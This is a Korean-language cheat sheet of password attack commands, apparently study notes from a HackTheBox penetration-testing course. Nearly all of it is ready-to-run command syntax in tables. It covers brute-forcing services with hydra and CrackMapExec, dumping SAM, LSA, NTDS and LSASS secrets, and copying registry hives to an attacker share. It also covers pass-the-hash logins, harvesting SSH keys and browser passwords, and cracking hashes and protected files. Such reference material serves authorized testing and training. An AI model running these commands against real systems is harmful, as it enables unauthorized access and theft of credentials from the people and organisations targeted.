# 비밀번호 공격

## 비밀번호 공격



### 대상에 연결 중



| **명령**                                                                     | **설명**                                                                               |
| -------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| `xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!`                    | 원격 데스크톱 프로토콜을 사용하여 Windows 대상에 연결하는 데 사용되는 CLI 기반 도구입니다.                             |
| `evil-winrm -i <ip> -u user -p password`                                   | Evil-WinRM을 사용하여 대상과 Powershell 세션을 설정합니다.                                           |
| `ssh user@<ip>`                                                            | SSH를 사용하여 지정된 사용자를 사용하여 대상에 연결합니다.                                                   |
| `smbclient -U user \\\\<ip>\\SHARENAME`                                    | smbclient를 사용하여 지정된 사용자를 통해 SMB 공유에 연결합니다.                                           |
| `python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/` | smbserver.py를 사용하여 Linux 기반 공격 호스트에 공유를 생성합니다. 대상에서 공격 호스트로 파일을 전송해야 할 때 유용할 수 있습니다. |

***

### 비밀번호 재사용/기본 비밀번호



> 라우터, 프린터, 방화벽 등 하나의 네트워크 장치를 간과하고 기본 자격 증명을 사용하거나 동일한 암호를 재사용하는 경우가 많습니다. 알려진 기본 자격 증명의 실행 목록을 유지하는 다양한 데이터베이스가 있습니다. 그 중 하나가 [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) 입니다 . Google 검색 - 기본 자격 증명 [HackTheBox CPTS 비밀번호 재사용 / 기본 비밀번호](https://academy.hackthebox.com/module/147/section/1328)

```
/home/kali/.local/bin/creds search mssql
```

### 비밀번호 변경



| **명령**                                                                                                                                  | **설명**                                                                                  |
| --------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`                                                           | cewl을 사용하여 웹사이트에 있는 키워드를 기반으로 단어 목록을 생성합니다.                                             |
| `hashcat --force password.list -r custom.rule --stdout > mut_password.list`                                                             | Hashcat을 사용하여 규칙 기반 단어 목록을 생성합니다.                                                       |
| `./username-anarchy -i /path/to/listoffirstandlastnames.txt`                                                                            | 사용자 이름 무정부 상태 도구를 미리 만들어진 이름 및 성 목록과 함께 사용하여 잠재적인 사용자 이름 목록을 생성합니다.                     |
| `curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt` | Linux 기반 명령인 컬, awk, grep 및 tee를 사용하여 비밀번호가 포함될 수 있는 파일을 검색하는 데 사용할 파일 확장자 목록을 다운로드합니다. |

***

### 원격 비밀번호 공격



| **명령**                                                                                               | **설명**                                                                                                                                                                                                                                                                |
| ---------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `crackmapexec winrm <ip> -u user.list -p password.list`                                              | WinRM을 통해 CrackMapExec를 사용하여 대상에 호스팅된 지정된 사용자 이름과 암호에 대한 무차별 공격을 시도합니다.                                                                                                                                                                                               |
| `crackmapexec smb <ip> -u "user" -p "password" --shares`                                             | CrackMapExec을 사용하여 지정된 자격 증명 세트를 사용하여 대상의 SMB 공유를 열거합니다.                                                                                                                                                                                                              |
| `hydra -L user.list -P password.list <service>://<ip>`                                               | 사용자 목록 및 비밀번호 목록과 함께 Hydra를 사용하여 지정된 서비스에 대한 비밀번호 해독을 시도합니다.                                                                                                                                                                                                          |
| `hydra -l username -P password.list <service>://<ip>`                                                | 사용자 이름 및 비밀번호 목록과 함께 Hydra를 사용하여 지정된 서비스에 대한 비밀번호 해독을 시도합니다.                                                                                                                                                                                                          |
| `hydra -L user.list -p password <service>://<ip>`                                                    | 사용자 목록 및 비밀번호와 함께 Hydra를 사용하여 지정된 서비스에 대한 비밀번호 해독을 시도합니다.                                                                                                                                                                                                             |
| `hydra -C <user_pass.list> ssh://<IP>`                                                               | 자격 증명 목록과 함께 Hydra를 사용하여 지정된 서비스를 통해 대상에 로그인을 시도합니다. 이는 크리덴셜 스터핑 공격을 시도하는 데 사용될 수 있습니다.                                                                                                                                                                               |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam`                               | 관리자 자격 증명과 함께 CrackMapExec를 사용하여 네트워크를 통해 SAM에 저장된 비밀번호 해시를 덤프합니다.                                                                                                                                                                                                    |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa`                               | 관리자 자격 증명과 함께 CrackMapExec를 사용하여 네트워크를 통해 LSA 비밀을 덤프합니다. 이런 방식으로 일반 텍스트 자격 증명을 얻을 수 있습니다. [SAM 공격 - LSA 비밀을 원격으로 덤프](https://academy.hackthebox.com/module/147/section/1315)                                                                                          |
| `crackmapexec smb <ip> -u <username> -p <password> --ntds`                                           | 관리자 자격 증명과 함께 CrackMapExec를 사용하여 네트워크를 통해 ntds 파일에서 해시를 덤프합니다.                                                                                                                                                                                                        |
| `evil-winrm -i <ip> -u Administrator -H "<passwordhash>"`                                            | Evil-WinRM을 사용하여 사용자 및 비밀번호 해시를 사용하여 Windows 대상과 Powershell 세션을 설정합니다. 이것은 공격 유형 중 하나입니다 `Pass-The-Hash`.                                                                                                                                                             |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | 제한된 관리 모드를 활성화하여 PTH, `Pass the hash`원격 데스크톱 RDP를 허용합니다. 이는 값이 0인 HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Lsa 아래에 새 레지스트리 키 비활성화RestrictedAdmin(REG\_DWORD)을 추가하여 활성화할 수 있습니다. [해시 PtH를 전달합니다.](https://academy.hackthebox.com/module/147/section/1638) |
| `xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B`                          | 레지스트리 키가 추가되면 /pth 옵션과 함께 xfreerdp를 사용하여 RDP 액세스 권한을 얻고 RDP를 사용하여 해시를 전달할 수 있습니다.                                                                                                                                                                                     |

***

### Windows 로컬 비밀번호 공격



| **명령**                                                                                                   | **설명**                                                                                                                                         |
| -------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| `tasklist /svc`                                                                                          | 실행 중인 프로세스를 나열하는 데 사용되는 Windows의 명령줄 기반 유틸리티입니다.                                                                                               |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`                          | Windows 명령줄 기반 유틸리티 findstr을 사용하여 다양한 파일 형식에서 "password" 문자열을 검색합니다.                                                                           |
| `Get-Process lsass`                                                                                      | Powershell cmdlet은 프로세스 정보를 표시하는 데 사용됩니다. LSASS 프로세스와 함께 이를 사용하면 명령줄에서 LSASS 프로세스 메모리를 덤프하려고 할 때 도움이 될 수 있습니다.                                 |
| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`                               | Windows에서 rundll32를 사용하여 LSASS 메모리 덤프 파일을 만듭니다. 그런 다음 이 파일을 공격 상자로 전송하여 자격 증명을 추출할 수 있습니다.                                                     |
| `pypykatz lsa minidump /path/to/lsassdumpfile`                                                           | Pypykatz를 사용하여 LSASS 프로세스 메모리 덤프 파일에서 자격 증명 및 비밀번호 해시를 구문 분석하고 추출하려고 시도합니다.                                                                    |
| `reg.exe save hklm\sam C:\sam.save`                                                                      | Windows에서 reg.exe를 사용하여 파일 시스템의 지정된 위치에 레지스트리 하이브 복사본을 저장합니다. 이는 모든 레지스트리 하이브(예: hklm\sam, hklm\security, hklm\system)의 복사본을 만드는 데 사용할 수 있습니다. |
| `move sam.save \\<ip>\NameofFileShare`                                                                   | Windows에서 이동을 사용하여 네트워크를 통해 지정된 파일 공유로 파일을 전송합니다.                                                                                              |
| `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`                 | Secretsdump.py를 사용하여 SAM 데이터베이스에서 비밀번호 해시를 덤프합니다. [비밀번호 공격 - SAM 공격](https://academy.hackthebox.com/module/147/section/1315)                   |
| `vssadmin CREATE SHADOW /For=C:`                                                                         | Windows 명령줄 기반 도구 vssadmin을 사용하여 `C:`. 이는 NTDS.dit의 복사본을 안전하게 만드는 데 사용할 수 있습니다.                                                                |
| `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` | Windows 명령줄 기반 도구 복사를 사용하여 의 볼륨 섀도 복사본에 대한 NTDS.dit 복사본을 만듭니다 `C:`.                                                                            |

***

### Linux 로컬 비밀번호 공격



| **명령**                                                                                                                                                                                            | **설명**                                                                                 |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done`                                               | Linux 시스템에서 .conf, .config 및 .cnf 파일을 찾는 데 사용할 수 있는 스크립트입니다.                           |
| `for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done`                                      | 지정된 파일 형식에서 자격 증명을 찾는 데 사용할 수 있는 스크립트입니다.                                              |
| `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done`                                       | 공통 데이터베이스 파일을 찾는 데 사용할 수 있는 스크립트입니다.                                                   |
| `find /home/* -type f -name "*.txt" -o ! -name "*.*"`                                                                                                                                             | Linux 기반 find 명령을 사용하여 텍스트 파일을 검색합니다.                                                  |
| `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done`                                     | 스크립트와 함께 사용되는 일반적인 파일 형식을 검색하는 데 사용할 수 있는 스크립트입니다.                                     |
| `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | 일반적인 유형의 문서를 찾는 데 사용되는 스크립트입니다.                                                        |
| `cat /etc/crontab`                                                                                                                                                                                | Linux 기반 cat 명령을 사용하여 자격 증명 검색 시 crontab의 내용을 봅니다.                                     |
| `ls -la /etc/cron.*/`                                                                                                                                                                             | Linux 기반 ls -la 명령을 사용하여 `cron`etc 디렉토리에 포함된 것으로 시작하는 모든 파일을 나열합니다.                    |
| `grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"`                                                                                                                                             | Linux 기반 명령 grep을 사용하여 파일 시스템에서 핵심 용어를 검색하여 `PRIVATE KEY`SSH 키를 검색합니다.                 |
| `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \| grep ":1"`                                                                                                                                        | `PRIVATE KEY`Linux 기반 grep 명령을 사용하여 사용자의 홈 디렉터리에 포함된 파일 내에서 키워드를 검색합니다 .               |
| `grep -rnw "ssh-rsa" /home/* 2>/dev/null \| grep ":1"`                                                                                                                                            | `ssh-rsa`Linux 기반 grep 명령을 사용하여 사용자의 홈 디렉터리에 포함된 파일 내에서 키워드를 검색합니다 .                   |
| `tail -n5 /home/*/.bash*`                                                                                                                                                                         | Linux 기반 tail 명령을 사용하여 bash 기록 파일을 통해 검색하고 마지막 5줄을 출력합니다.                              |
| `python3 mimipenguin.py`                                                                                                                                                                          | Python3을 사용하여 Mimipenguin.py를 실행합니다.                                                   |
| `bash mimipenguin.sh`                                                                                                                                                                             | bash를 사용하여 Mimipenguin.sh를 실행합니다.                                                      |
| `python2.7 lazagne.py all`                                                                                                                                                                        | python2.7을 사용하여 모든 모듈과 함께 Lazagne.py를 실행합니다.                                           |
| `ls -l .mozilla/firefox/ \| grep default`                                                                                                                                                         | Linux 기반 명령을 사용하여 Firefox에 저장된 자격 증명을 검색한 다음 `default`grep을 사용하여 키워드를 검색합니다.           |
| `cat .mozilla/firefox/1bplpd86.default-release/logins.json \| jq .`                                                                                                                               | Linux 기반 명령 cat을 사용하여 Firefox에 저장된 자격 증명을 JSON으로 검색합니다.                                |
| `python3.9 firefox_decrypt.py`                                                                                                                                                                    | Firefox\_decrypt.py를 실행하여 Firefox에 저장된 암호화된 자격 증명을 해독합니다. 프로그램은 python3.9를 사용하여 실행됩니다. |
| `python3 lazagne.py browsers`                                                                                                                                                                     | Python 3을 사용하여 Lazagne.py 브라우저 모듈을 실행합니다.                                              |

***

### 비밀번호 크래킹



| **명령**                                                                                                       | **설명**                                                                                  |
| ------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------- |
| `hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt`                                          | Hashcat을 사용하여 지정된 단어 목록을 사용하여 NTLM 해시를 크랙합니다.                                           |
| `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show`                   | Hashcat을 사용하여 단일 NTLM 해시를 해독하고 결과를 터미널 출력에 표시합니다.                                       |
| `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`                                          | 크래킹을 준비하기 위해 unshadow를 사용하여 passwd.bak 및 Shadow.bk의 데이터를 하나의 단일 파일로 결합합니다.              |
| `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`                         | Hashcat을 단어 목록과 함께 사용하여 그림자가 없는 해시를 크랙하고 크랙된 해시를 unshadowed.cracked라는 파일로 출력합니다.        |
| `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`                                                            | md5-hashes.list 파일의 md5 해시를 해독하기 위해 단어 목록과 함께 Hashcat을 사용합니다.                           |
| `hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked` | Hashcat을 사용하여 단어 목록을 사용하여 추출된 BitLocker 해시를 크랙하고 크랙된 해시를 backup.cracked라는 파일로 출력합니다.    |
| `ssh2john.pl SSH.private > ssh.hash`                                                                         | Ssh2john.pl 스크립트를 실행하여 SSH.private 파일의 SSH 키에 대한 해시를 생성한 다음 해시를 ssh.hash라는 파일로 리디렉션합니다. |
| `john ssh.hash --show`                                                                                       | John을 사용하여 ssh.hash 파일의 해시 크래킹을 시도한 다음 결과를 터미널에 출력합니다.                                  |
| `office2john.py Protected.docx > protected-docx.hash`                                                        | 보호된 .docx 파일에 대해 Office2john.py를 실행하고 이를 protected-docx.hash라는 파일에 저장된 해시로 변환합니다.       |
| `john --wordlist=rockyou.txt protected-docx.hash`                                                            | 해시 protected-docx.hash를 해독하기 위해 단어 목록 rockyou.txt와 함께 John을 사용합니다.                      |
| `pdf2john.pl PDF.pdf > pdf.hash`                                                                             | PDF 파일을 PDF로 변환하려면 Pdf2john.pl 스크립트를 실행해야 합니다.                                          |
| `john --wordlist=rockyou.txt pdf.hash`                                                                       | PDF 해시를 해독하기 위해 단어 목록과 함께 John을 실행합니다.                                                  |
| `zip2john ZIP.zip > zip.hash`                                                                                | zip 파일에 대해 Zip2john을 실행하여 해시를 생성한 다음 해당 해시를 zip.hash라는 파일에 추가합니다.                       |
| `john --wordlist=rockyou.txt zip.hash`                                                                       | zip.hash에 포함된 해시를 해독하기 위해 단어 목록과 함께 John을 사용합니다.                                        |
| `bitlocker2john -i Backup.vhd > backup.hashes`                                                               | Bitlocker2john 스크립트를 사용하여 VHD 파일에서 해시를 추출하고 출력을 backup.hashes라는 파일로 보냅니다.               |
| `file GZIP.gzip`                                                                                             | Linux 기반 파일 도구를 사용하여 파일 형식 정보를 수집합니다.                                                   |
| `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done`  | 아카이브에서 파일을 추출하기 위해 for 루프를 실행하는 스크립트입니다.                                                |
